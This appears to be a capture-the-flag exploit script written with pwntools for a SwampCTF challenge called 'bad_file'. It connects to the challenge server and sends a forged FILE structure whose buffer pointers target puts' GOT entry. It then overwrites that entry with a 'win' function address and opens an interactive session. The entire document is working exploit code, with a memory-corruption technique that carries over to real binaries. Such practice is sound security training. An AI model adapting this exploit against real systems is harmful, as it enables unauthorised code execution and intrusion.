from pwn import *

#context.log_level = "DEBUG"
context.terminal = ['tmux', 'splitw', '-h']

#target = process("./bad_file")
target = remote("chal1.swampctf.com", 2050)
#gdb.attach(target)
#raw_input()

puts_got = 0x601020
win = 0x4008a7
fwrite_flags = 0xfbad1800
fread_flags = 0xfbad0000

target.sendline("1")
target.sendline("noopnoop")

payload2 = p64(fread_flags)
payload2 += (p64(0) * 6)
payload2 += p64(puts_got)
payload2 += p64(puts_got+0x10)
payload2 += (p64(0)*5)
payload2 += p64(0)

target.recvuntil("name.")
target.sendline(payload2)
target.recvuntil("void!!")
target.sendline(p64(win)*5)

target.interactive()
